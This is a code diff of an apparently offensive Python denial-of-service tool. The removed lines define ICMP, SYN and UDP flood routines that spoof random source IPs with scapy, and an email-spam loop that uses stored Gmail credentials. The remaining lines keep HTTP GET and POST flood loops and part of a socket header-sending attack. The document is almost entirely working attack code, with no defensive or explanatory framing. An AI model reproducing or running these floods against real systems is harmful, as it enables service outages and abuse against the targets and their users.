@@ -2,73 +2,24 @@ from scapy.all import *
 import time as timing
 import requests
 import json
-import threading
 import random
 import socket
-import utils
-from globals import GMAIL_ACCOUNT_FILE, ICMP_PACKET_AMOUNT, SOCKET_COUNT
-from log import log
-from emailsender import MailSender
+from globals import SOCKET_COUNT
 
-def spoof_ip():
-    return RandIP()
 
-def rand_int():
-	return random.randint(1000,9000)
-
-class Layer3:
-    @staticmethod
-    def icmp_flood(target: str, time: int):
-        end_t = timing.time() + time
-        IP_Packets = []
-        for i in range(ICMP_PACKET_AMOUNT):
-            IP_Packets.append(scapy.all.IP(dst=str(target), src=spoof_ip())/scapy.all.ICMP())
-        while(timing.time() < end_t):
-            send(IP_Packets, verbose=0)
-            time.sleep(8)
-
-class Layer4:
-    @staticmethod
-    def syn_flood(target: str, port: int, time: int):
-        end_t = timing.time() + time
-        IP_Packet = scapy.all.IP(dst=str(target), src=spoof_ip())
-        TCP_Packet = scapy.all.TCP(sport=rand_int(), dport=int(port), flags="S", seq=rand_int(), window=rand_int())
-        while(timing.time() < end_t):
-            send(IP_Packet/TCP_Packet, verbose=0)
-
-    @staticmethod
-    def udp_flood(target: str, port: int, time: int):
-        end_t = timing.time() + time
-        IP_Packet = scapy.all.IP(dst=str(target), src=spoof_ip())
-        UDP_Packet = scapy.all.UDP(sport=rand_int(), dport=int(port))
-        payload = "A" * 450
-        while(timing.time() < end_t):
-            send(IP_Packet/UDP_Packet/payload, verbose=0)
-            
-    @staticmethod
-    def email_spam(target: str, time: int, message: str):
-        account, password = utils.get_gmail_account_from_file(GMAIL_ACCOUNT_FILE)
-        mail_sender = MailSender(account, password)
-        mail_sender.connect()
-        end_t = timing.time() + time
-        while(timing.time() < end_t):
-            mail_sender.send_mail(target, message)
-            timing.sleep(5)
-        mail_sender.disconnect()
-        
 class Layer7:
     @staticmethod
     def http_get_flood(target: str, time: int):
         end_t = timing.time() + time
-        while(timing.time() < end_t):
-             x = requests.get(target)
+        while (timing.time() < end_t):
+            x = requests.get(target)
 
     @staticmethod
     def http_post_flood(target: str, time: int, payload: str):
         end_t = timing.time() + time
         payload = json.loads(payload)
-        while(timing.time() < end_t):
-             res = requests.post(target, data=json.dumps(payload))
+        while (timing.time() < end_t):
+            res = requests.post(target, data=json.dumps(payload))
 
     @staticmethod
     def __send_header(name, value, socket):
@@ -119,5 +70,5 @@ class Layer7:
                         break
                 timing.sleep(15)
 
-            except(KeyboardInterrupt, SystemExit):
+            except (KeyboardInterrupt, SystemExit):
                 break
